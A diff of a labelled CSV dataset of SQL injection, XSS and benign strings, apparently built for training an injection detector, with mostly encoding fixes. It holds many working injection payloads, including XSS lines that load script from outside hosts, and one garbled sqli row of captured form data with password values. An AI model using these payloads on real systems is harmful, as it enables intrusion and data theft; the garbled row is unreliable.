@@ -1,4 +1,4 @@
-payload,type
+﻿payload,type
 3.62E+15,benign
 "1%""   )    )     )   waitfor delay '0:0:5'--",sqli
 "1""  )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and   (  ""tlpw""  =  ""tlpw",sqli
@@ -224,7 +224,7 @@ select   (  case when   (  4780  =  4432  )   then 4780 else 4780*  (  select 47
 <svg/onload=alert(1),xss
 "<a href=""\x19javascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
 5.83E+15,benign
-"  SELECT TIMESTAMP ( ""2017-07-23"",  ""13:10:11"" ) ;",sqli
+"  SELECT TIMESTAMP ( ""2017-07-23"",¬† ""13:10:11"" ) ;",sqli
 1'||  (  select 'yucg' where 2576  =  2576 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual   )    )   ||',sqli
 &#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>',xss
 select   (  case when   (  3486  =  6373  )   then 3486 else 3486*  (  select 3486 from mysql.db  )   end  )  #,sqli
@@ -522,7 +522,7 @@ comalada,benign
 masashi,benign
 pladeval berganciano,benign
 1'  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  'eqfh'  =  'eqfh,sqli
-"�<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",xss
+" <HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",xss
 "1'   )    )    as cbka where 3176  =  3176 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",sqli
 -1876%'  )   union all select 6463--,sqli
 <iframe/onreadystatechange=\u0061\u006C\u0065\u0072\u0074('\u0061') worksinIE>,xss
@@ -777,7 +777,7 @@ sidonio,benign
 "1%'   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",sqli
 plinto,benign
 47185,benign
-<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa� aaaaaaaaa aaaaaaaaaa� href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,xss
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe,xss
 <svg contentScriptType=text/vbs><script>MsgBox+1,xss
 SELECT * FROM fact WHERE spring LIKE '%tower%',sqli
 """`'><script>\xE2\x80\x89javascript:alert(1)</script>",xss
@@ -803,7 +803,7 @@ select sleep  (  5  )   and    (    (     (  'klma'  =  'klma,sqli
 maycel,benign
 chinaphan@viajesdacapalla.eh,benign
 bernadet,benign
-"<meta charset=""mac-farsi"">_script_javascript:alert(1)_/script_",xss
+"<meta charset=""mac-farsi"">¼script¾javascript:alert(1)¼/script¾",xss
 "-4168'  )   union all select 2618,2618#",sqli
 "1'  )   as asjj where 1721  =  1721 union all select null,null,null,null,null,null--",sqli
 tinajas,benign
@@ -866,7 +866,7 @@ vilamasa pacheca,benign
 c/ rivera de los limonetes 98,benign
 "<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">",xss
 vindicacin,benign
-_scriptualert(EXSSE)_/scriptu,xss
+žscriptualert(EXSSE)ž/scriptu,xss
 select pg_sleep  (  5  )   and   (  1044  =  1044,sqli
 select   (  case when   (  6652  =  1932  )   then 6652 else 6652*  (  select 6652 from information_schema.character_sets  )   end  )  #,sqli
 "-1422%""  )   or make_set  (  9539  =  9519,9519  )   and   (  ""%""  =  """,sqli
@@ -961,7 +961,7 @@ kaunas,benign
 "1'  )   where 4092  =  4092 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",sqli
 sant andreu salou,benign
 <BODY ONLOAD=javascript:alert(1)>,xss
-"<div id=""x"">XXX</div> <style>� #x{font-family:foo[bar;color:green;}� #y];color:red;{}� </style>",xss
+"<div id=""x"">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>",xss
 cobo,benign
 7.69E+15,benign
 "<;BODY onload!#$%&;()*~+-_.,:;?@[/|\]^`=alert("";XSS"";)>;",xss
@@ -1195,7 +1195,7 @@ to_timestamp_tz,benign
 select   (  case when   (  4341  =  7041  )   then 4341 else 4341*  (  select 4341 from mysql.db  )   end  )  #,sqli
 "-1055' union all select 7758,7758,7758,7758,7758,7758--",sqli
 &config=htdig&amp;restrict=&amp;exclude=&amp;method=and&amp;format=long&amp;sort=score&amp;words=%22%3E%20d%3Csvg/onload=confirm%28/xssposed/%29%3E,xss
-&lt;!--[if gte IE 4]&gt;� � � � � � � �,xss
+&lt;!--[if gte IE 4]&gt;               ,xss
 "-9615  )   as dntk where 4780  =  4780 union all select 4780,4780,4780,4780,4780,4780,4780,4780#",sqli
 c9b4+tal,benign
 "<IMG SRC=x ononline=""alert(String.fromCharCode(88,83,83))"">",xss
@@ -1341,7 +1341,7 @@ ezio,benign
 -6179   )    )    or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (   7732  =  7732,sqli
 vilca llora,benign
 veracruz,benign
-"<IMG SRC=""jav� � ascript:javascript:alert(1);"">",xss
+"<IMG SRC=""jav    ascript:javascript:alert(1);"">",xss
 2354,benign
 "1' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and 'rupq'  =  'rupq",sqli
 "call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'hmqd'  =  'hmqd",sqli
@@ -1460,7 +1460,7 @@ sacudir,benign
 tabanera de cerrato,benign
 1'   )    )    waitfor delay '0:0:5' and    (    (   'bbqk'  =  'bbqk,sqli
 -7675%'   )    )     )   order by 1--,sqli
-"<div id=""x"">XXX</div> <style>� #x{font-family:foo[bar;color:green;}� #y];color:red;{}� </style>",xss
+"<div id=""x"">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>",xss
 SELECT wp_posts.* FROM wp_posts WHERE 1 = 1 AND wp_posts.post_name IN  ( 'home-page-template' )  AND  (  0  =  1  )  AND wp_posts.post_type  =  'wp_template' AND   (  (  wp_posts.post_status  =  'publish'  )  )   GROUP BY wp_posts.ID ORDER BY wp_posts.post_date DESC,sqli
 3.85E+14,benign
 "<? foo=""><x foo='?><script>javascript:alert(1)</script>'>"">",xss
@@ -2248,7 +2248,7 @@ c/ torre de romo s/n 1f,benign
 "SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 239186 )  ORDER BY meta_id ASC",sqli
 "-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",sqli
 "1'  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and   (  'cogf' like 'cogf",sqli
-"<a� href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click� Me</a>",xss
+"<a  href=""data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203"">Click  Me</a>",xss
 <script>/* *\x2A/javascript:alert(1)// */</script>,xss
 "<div style=""background-image: url(javascript:document.vulnerable=true;);"">",xss
 "<script\x0Dtype=""text/javascript"">javascript:alert(1);</script>",xss
@@ -2474,8 +2474,8 @@ xi629d02,benign
 "praza madre lestonnac, s/n",benign
 burns40,benign
 <STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,xss
-<IMG SRC=javascript:alert(�XSS�)> � � �,xss
-<img/src=`%00` onerror=this.onerror=confirm(1)�,xss
+<IMG SRC=javascript:alert(‘XSS’)>      ,xss
+<img/src=`%00` onerror=this.onerror=confirm(1) ,xss
 12190,benign
 "-1339   )    )     )   union all select 6318,6318,6318,6318,6318,6318,6318,6318,6318#",sqli
 3180,benign
@@ -2521,7 +2521,7 @@ di rado elejalde,benign
 "1' where 4334  =  4334 or elt  (  5873  =  5873,sleep  (  5   )    )   #",sqli
 "<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:javascript:alert(1);"">",xss
 26241,benign
-<<SCRIPT>alert(�XSS�);//<</SCRIPT>,xss
+<<SCRIPT>alert(“XSS”);//<</SCRIPT>,xss
 "linares, 42",benign
 "1""   )    )    as spvl where 2242  =  2242 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",sqli
 1 where 4785  =  4785 and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --,sqli
@@ -2714,7 +2714,7 @@ ergasto,benign
 "<script src=""javascript:alert(1)"">",xss
 "1""   )    )    as jikg where 8258  =  8258 and   (  3973  =  1047  )  *1047--",sqli
 "-3960""   )    )    union all select 7813,7813,7813,7813,7813,7813--",sqli
-<marquee onstart='javascript:alert('1');'>=(___)=,xss
+<marquee onstart='javascript:alert('1');'>=(◕_◕)=,xss
 "1'||  (  select 'fbtm' where 1335  =  1335 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",sqli
 -5854   )    )     )   union all select 5645#,sqli
 "1""   )    )    order by 1#",sqli
@@ -3011,11 +3011,11 @@ golari,benign
 "iif  (  1149  =  4765,1,1/0  )  ",sqli
 ramaprak,benign
 "perl -e 'print \""<IMG SRC=java\0script:alert(\""XSS\"")>\"";' > out",xss
-"<script>alert(String.fromCharCode(88,83,83))</script>�",xss
+"<script>alert(String.fromCharCode(88,83,83))</script> ",xss
 [\xC0][\xBC]script>document.vulnerable=true;[\xC0][\xBC]/script>,xss
 radunsky_oses@guejosgratis.cg,benign
 1  )   rlike sleep  (  5  )   and   (  5724  =  5724,sqli
-"<meta charset=""mac-farsi"">_script_javascript:alert(1)_/script_",xss
+"<meta charset=""mac-farsi"">¼script¾javascript:alert(1)¼/script¾",xss
 "1""  )   as qwyt where 4236  =  4236 union all select null,null,null,null,null--",sqli
 1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #,sqli
 "<OBJECT CLASSID=""clsid:333C7BC4-460F-11D0-BC04-0080C7055A83""><PARAM NAME=""DataURL"" VALUE=""javascript:alert(1)""></OBJECT>",xss
@@ -3187,7 +3187,7 @@ select sleep  (  5  )   and   (  4863  =  4863,sqli
 ubraco,benign
 kalpak,benign
 """`'><script>\x0Ajavascript:alert(1)</script>",xss
-<img src ?itworksonchrome?\/onerror = alert(1)___,xss
+<img src ?itworksonchrome?\/onerror = alert(1)​​​,xss
 1'||  (  select 'wszt' from dual where 6854  =  6854 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  ||',sqli
 albillos,benign
 "1""  )   as rdvm where 6360  =  6360 and sleep  (  5  )  --",sqli
@@ -3301,7 +3301,7 @@ raimondo,benign
 <IMG SRC=javascript:alert(&quot;XSS&quot;)>,xss
 "-6020'+  (  select isrz where 2489  =  2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",sqli
 1   )    )    as ctqr where 2609  =  2609,sqli
-"<A HREF=""htt� � p://6� � 6.000146.0x7.147/"">XSS</A>",xss
+"<A HREF=""htt    p://6    6.000146.0x7.147/"">XSS</A>",xss
 "1"" procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  ",sqli
 yessica,benign
 "  SELECT   COALESCE ( NULL, NULL, NULL, 'W3Schools.com', NULL, 'Example.com' ) ;",sqli
@@ -3397,7 +3397,7 @@ maduric@biosoftware.th,benign
 90179643r,benign
 1.65E+15,benign
 4or3554e0a,benign
-<;!--[if gte IE 4]>;� � � � � �,xss
+<;!--[if gte IE 4]>;           ,xss
 Execute(MsgBox(chr(88)&chr(83)&chr(83)))<,xss
 "-4012""  )   or make_set  (  9354  =  9354,7185  )   and   (  ""ccfn""  =  ""ccfn",sqli
 mandayona,benign
@@ -3502,9 +3502,9 @@ obscurantismo,benign
 brogley,benign
 henrikson@hojainformativas.int,benign
 "<a href=""\x0Fjavascript:javascript:alert(1)"" id=""fuzzelement1"">test</a>",xss
-<IMG SRC=javascript:alert('XSS')>� � � �,xss
+<IMG SRC=javascript:alert('XSS')>       ,xss
 5.20E+15,benign
-%22/%3E%3CBODY%20onload=�document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)�%3E,xss
+%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E,xss
 "1  )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",sqli
 25244,benign
 1'  )   as xwlf where 9424  =  9424,sqli
@@ -3600,7 +3600,7 @@ fl5ct499t1,benign
 carlie,benign
 "<x '=""foo""><x foo='><img src=x onerror=javascript:alert(1)//'>",xss
 "c/ curadero, 101, 12?e",benign
-"<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>_",xss
+"<meta http-equiv=""refresh"" content=""0;javascript&colon;alert(1)""/>​",xss
 <iframe src=http://ha.ckers.org/scriptlet.html <,xss
 """`'><script>\xE2\x80\xAFjavascript:alert(1)</script>",xss
 &q=%22ri%22-alert(%22XSS%22)-%22lo%22,xss
@@ -3661,7 +3661,7 @@ chilln,benign
 "SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 262329 )  ORDER BY meta_id ASC",sqli
 "1%' union all select null,null,null,null,null,null--",sqli
 cr48e24n,benign
-<SCRIPT> alert(�XSS�); </SCRIPT>,xss
+<SCRIPT> alert(“XSS”); </SCRIPT>,xss
 "<embed type=""image"" src=%(scriptlet)s></embed>",xss
 alhama de murcia,benign
 lamarr@tardos.mobi,benign
@@ -3784,7 +3784,7 @@ sile,benign
 "<html onmouseover html onmouseover=""javascript:javascript:alert(1)""></html onmouseover>",xss
 d76en3r9n8z01,benign
 reiko,benign
-�)alert(1);//,xss
+‘)alert(1);//,xss
 """`'><script>\x0Bjavascript:alert(1)</script>",xss
 "&id=0205""><script>alert(String.fromCharCode(88,83,83))</script>",xss
 -3677'   )    )    or 1939  =  4484,sqli
@@ -3955,7 +3955,7 @@ sagaceta farell,benign
 rigente,benign
 "1  )   as zqxa where 5718  =  5718 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",sqli
 "1'||  (  select 'bmyt' from dual where 9407  =  9407 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",sqli
-_script_alert(�XSS�)_/script_,xss
+¼script¾alert(¢XSS¢)¼/script¾,xss
 "<script a="">"" SRC=""http://www.securitycompass.com/xss.js""></script>",xss
 "1'+  (  select 'eoxk' where 6621  =  6621 union all select null,null#",sqli
 "1   )    )    as hpxw where 1826  =  1826 union all select null,null,null,null,null,null,null,null#",sqli
@@ -4222,7 +4222,7 @@ artenio,benign
 "<img src\x10=x onerror=""javascript:alert(1)"">",xss
 "1%'   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  '%'  =  '",sqli
 2.02E+15,benign
-�; alert(1);,xss
+‘; alert(1);,xss
 "&cmd=browse&project=999999.9%27%22%3E%3CA%20onmouseover=alert%28/XSSPOSED/%29%3EXSS,%20needs%20to%20be%20fixed%20ASAP%3C/a%3E",xss
 <script>~'\u0061' ; \u0074\u0068\u0072\u006F\u0077 ~ \u0074\u0068\u0069\u0073. \u0061\u006C\u0065\u0072\u0074(~'\u0061')</script U+,xss
 94731203e,benign
@@ -4454,7 +4454,7 @@ geffner-schoo@bacoespecialseleccin.bm,benign
 "<A HREF=""http://66.102.7.147/"">XSS</A>",xss
 "alert;pg(""XSS"")",xss
 llovet,benign
-"""<IMG SRC="""" &#14;� javascript:alert('XSS');"""">""",xss
+"""<IMG SRC="""" &#14;  javascript:alert('XSS');"""">""",xss
 "-8824%'   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   '%'  =  '",sqli
 "<SCRIPT ="">"" SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
 &q=/></script><script>alert('XSS');</script>,xss
@@ -4626,7 +4626,7 @@ ridgely.loyat@cbgerindote.sk,benign
 "select count  (  *  )   from generate_series  (  1,5000000  )   and '%'  =  '",sqli
 "-4528""  )   or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  ""fxmt"" like ""fxmt",sqli
 giralda,benign
-"<iframe� src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>",xss
+"<iframe  src=""data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E""></iframe>",xss
 "1""   )    )    union all select null,null,null,null,null--",sqli
 &&s=site:reddit.com&fltdigg=%27;alert%28document.cookie%29;a=%27,xss
 SELECT government ( s )  FROM repeat SELECT vegetable ( s ) ,sqli
@@ -4778,14 +4778,14 @@ jackelyn,benign
 "-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",sqli
 1'  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'uwbt' like 'uwbt,sqli
 "ABC<div style=""x:\xE2\x80\x85expression(javascript:alert(1)"">DEF",xss
-<BODY ONLOAD=alert(�XSS�)>,xss
+<BODY ONLOAD=alert(‘XSS’)>,xss
 06363808f,benign
 "calle jose canovas pujante, 106 8g",benign
 1'||  (  select 'allj' where 7334  =  7334,sqli
 arguisuelas,benign
 &#60;IMG SRC&#61;&#34;jav&#38;&#35;x09&#59;ascript&#58;alert&#40;&#39;XSS&#39;&#41;&#59;&#34;&#62;,xss
 "1'  )   procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",sqli
-"<math href=""javascript:javascript:alert(1)"">CLICKME</math>� <math> <maction actiontype=""statusline#http://google.com"" xlink:href=""javascript:javascript:alert(1)"">CLICKME</maction> </math>",xss
+"<math href=""javascript:javascript:alert(1)"">CLICKME</math>  <math> <maction actiontype=""statusline#http://google.com"" xlink:href=""javascript:javascript:alert(1)"">CLICKME</maction> </math>",xss
 "1 where 9072  =  9072 and elt  (  4249  =  4249,7259  )  --",sqli
 bakey_noah@inmobiliariahangar.ki,benign
 kiam,benign
@@ -4931,7 +4931,7 @@ dinaband,benign
 1  )   where 1487  =  1487,sqli
 morn de almazn,benign
 1'   )    )    and   (  7517  =  3423  )  *3423 and    (    (   'aenz'  =  'aenz,sqli
-"�<script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>",xss
+" <script/src=&#100&#97&#116&#97:text/&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x000070&#x074,&#x0061;&#x06c;&#x0065;&#x00000072;&#x00074;(1)></script>",xss
 "perl -e ';print "";<;IM SRC=java\0script:alert("";XSS"";)>"";;';>; out",xss
 66702102d,benign
 "-1869""   )    )     )   union all select 7122,7122,7122,7122,7122,7122,7122,7122,7122--",sqli
@@ -4969,7 +4969,7 @@ ti20,benign
 6110,benign
 15107,benign
 komai@ofertachina.ir,benign
-"�<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",xss
+" <HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-alert('XSS');+ADw-/SCRIPT+AD4-",xss
 "-6870""  )   as deox where 8198  =  8198 union all select 8198#",sqli
 chao-pin2,benign
 "c/ francisco de ricci 23, 1?c",benign
@@ -5261,7 +5261,7 @@ end-- elvi,sqli
 "&q=fox""%29;%20alert%28""XSS""%29;//&submit=Search",xss
 1%'   )    )    and 2006  =  2006,sqli
 <svg><script ?>alert(1),xss
-<img/src=`` onerror=this.onerror=confirm(1)�,xss
+<img/src=`` onerror=this.onerror=confirm(1) ,xss
 "<body onMouseOver body onMouseOver=""javascript:javascript:alert(1)""></body onMouseOver>",xss
 "1   )    )     )   and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (     (  9401  =  9401",sqli
 "<meta HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:document.vulnerable=true;"">",xss
@@ -5332,14 +5332,14 @@ select   (  case when   (  4774  =  1535  )   then 4774 else cast  (  1 as int  
 1' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and 'mepp'  =  'mepp,sqli
 itter,benign
 nrez muriscot,benign
-"de]]>  </email_address>   <find_account_answer>  <![CDATA[fqaepqdkct]]>  </find_account_answer>   <find_account_question>  <![CDATA[6]]>  </find_account_question>   <homepage>  <![CDATA[]]>  </homepage>   <is_secret>  <![CDATA[]]>  </is_secret>   <methodCall>   <mid>  <![CDATA[qna]]>  </mid>   <module>  <![CDATA[member]]>  </module>   <nick_name>  <![CDATA[ElwoodBuckley041104]]>  </nick_name>   <params>   <password2>  <![CDATA[Yxg6dsF5iU]]>  </password2>   <password>  <![CDATA[Yxg6dsF5iU]]>  </password>   <reward_point>  <![CDATA[0]]>  </reward_point>   <title>  <![CDATA[Ways To Make Cash Online - Make Money From Home]]>  </title>   <user_id>  <![CDATA[ElwoodBuckley041104]]>  </user_id>   <user_name>  <![CDATA[ElwoodBuckley041104]]>  </user_name>    =    =     =    =  01 @7520 A3B10 A3B12C41 A3B12C411 APP AR-203 ASCd AgAHMzM3MsdfjMwMExG6Pvz1i3DhGd7DSt5Ve9Qu/n91BdfdEB5EbdeO/M5lphLOo5yOn/ZyS1jabRmzu2WUHoScLEwJjaDz2yHm9tJWbLuELC/JM8Eix/VtyWmMO5osa8FbYZnPanAxI7Ty0n7avQytu2rEK2F+N+C390zLVThtSXL1Isk49OSEWuEAzdaRlmLUWcpx6XSDjFZ++1cgwEoAILJ9Q5NObm6nYipbGovJ6YZgiEncnT9GU6x6sgKNppX0YgXXmss+0Qi5eXWmDn30UlwjfTbmc+Ta17XLDXGm6f/hiM7f4fde+5c+Pavn9EIZXYe9K6G/GyCM7I0dzjPIsjEOwl96y+fYXoZoJcp79kLwtTy6F1dL1HAs8DSFoIrfoUs7zyFtzgMnV2K0sT68IwWkiof2eM1Xes5nbDzmHOEQZ+loGLF2UBIyGcz4cSCtdZhrJXt7TxSIzeHKYpCgtVhNo4zJDlHo7zpUnR+8dSlUsdf18e08zs4iGMRK43bhv6oGA6dUw/dX+exrGTL+NMOThQUQvFdYNsc+AFGWo3PqLFhjQ9s3RzK5krr6II3e2vKhs36q7NgNgaIlQNiqNo8cNbE8iVUxZcHhvxaOStpiUN+N9KY4sZ51Ole8offosPb1NqXs3575SXU+1dEpaggUrUJqKjeUM4Hu90KoHmbL2+/zt6Bk+GCnk2WBKJENscEetfLBCBzBGXPlKC7/G5W4k8Gviynn4qCUoD9FvagtKTTF4MaA5rZtrKRabUae++259WRUZ3VEHfzjpXLaogS9DoeVHDebAClkkuAdU6F6fa2wFIM58  =   AgAHMzM3MjMwMJnS2WotX5wisoSRNiccx9VSfDnC/TFaDo/9wddE55SqhLOo5yOn/ZyS1jabRmzu2WUHoScLEwJjDz2yHsm9tJWa4Oyj22HdAIrJSshxe0KmKTxD4lBsReQqG6IN3ULz8oaEwMT7lKcx4Ukfep1IwCe7xHXlsW2gCFxdZmh731jKLuFDn/9rcY4AkdgqajLoHmVnLk3uBcTxbQS8XWJJk8++VnGu9toYSualxl0CgjSRgl01ddYqiaVYQOBShAcHCdfbHmbDZIPrPowSVFUAGpYsVDx3fVEdDa8NKRAPMI3wAlq40FqZDdhNXNr70OL9ZRzS82kWdHP8w2hd1KcIheAxDSw4a5FLAjzSWrdjcOvUfJQO5QT/90J19i2IWnuTNIdTzOcf3uVy23sHyWmsBEWHyaSsKDm7dfOPPwHIWamQKkdcm5KoWp/FgoIR09S0cn/BZzLOsdcFSbhYOxA  =    =   B_qna B_solution Bn2GepSdoAsdfe4V4a1@V$K@Bn2GepSdoAe4V4a1@23V$K@PlVEBnTVHAYa01hH@V$K@eTZyMZ0F3YBl4Ozr@V$K@Bn2GepSdoAe4V4a1@V$K@xJ8t+K+x1e6/nqCp@V$a1K@PLnd8fSYoXD3QL3s Board00001 C CYsdfSL7J/aXGaV/30TU412JWfjHA  =    =   Cont Content-Disposi Content-Disposition: form- Content-Disposition: form-data; name  =  ""app"" Content-Disposition: form-data; name  =  ""cd_loan_type"" Content-Disposition: form-data; name  =  ""id_finance"" Content-Disposition: form-data; name  =  ""mode"" Content-Disposition: form-data; name  =  ""no"" Content-Disposition: form-data; name  =  ""no_goods"" Content-Disposition: form-data; name  =  ""path"" Content-Disposition: form-data; name  =  ""pnm"" Content-Disposition: form-data; name  =  ""return_page"" Content-Disposition: form-data; name  =  ""type"" D2 D3 DC-3000 DF Del E EA F1 F4 F5 F6 FG123P8HQ+vasd0pVzD2O+YlD+v1V2g  =    =   FmsdfVDvlXqIVetUIzs@V$K@Vj+fqZ6TuN123pq1X2w@V$K@dqRLntgax88tXGB3@V$K@R43SsinxoXFCKjAy FmVDvlXqIVetUIzs@V$K@n5aESvV0q4Se1iBn8@Vasd$K@M5IvfWDvvs5y1TnouS@V$K@Vj+fqZ6TuNpq1X2w@V$K@fuvKbfOrsGKtsDsdf7l@V$K@ZtgfO1WcVPD67KFos@V$K@dqRLntgax88tXGB3 Free Fun Hf6DNiDdq1xzaB3bdDT@V$512K@MRn61gAqhi0iae213dd@V$K@Hf6DNisdfDxzaB3bdDT@V$K@rSTgzjcYIY7Iirl+@V$K@iTI/NtJsfFTdH8ah@V$K@Hf6DNiDxzaB3bdDT@V$K@EdodGNxPNEYWbWcs JVwH/8xSq6ezJPYt@V$s23K@vPr4I41U8oeym0BEi+@V$K@3WPcTx1mJ5sBdACl@V$K@3WPcTx1mJ5sBdACl@V$K@QpmadUUMPKv2tSJP@V$K@JVwH/8xSq6ezasdfJPYt@V$K@vPr4IU8oeym0BEi+ L-840 360ml 트리거 L-840 450 트리거 L5VSRxv4dfoDXwH+hZ@V$K@T0NO9ASwF7J4gKAh@V$K@VWvmclMqqannOAJf@V$K@ERQVjx2OGeE0Mxdf@V$K@VicBva15FL1xm0WH@Va123$K@T0NO9ASwF7J4gKAh@V$K@VicBva15FL1xm0WH PSC-1 NPP Purchase omnicef without prescri QJt5lWbasdftpJ3yciKW@V$K@Hf6DNi123Dxz1aB3bdDT@V$K@iTI/NtJsfFaTdH8vah@V$K@MRn61gAqhi0iaedd QNA_7 R RandD S SF-1013 SR-600 School TC-100 TP1 TracyJat 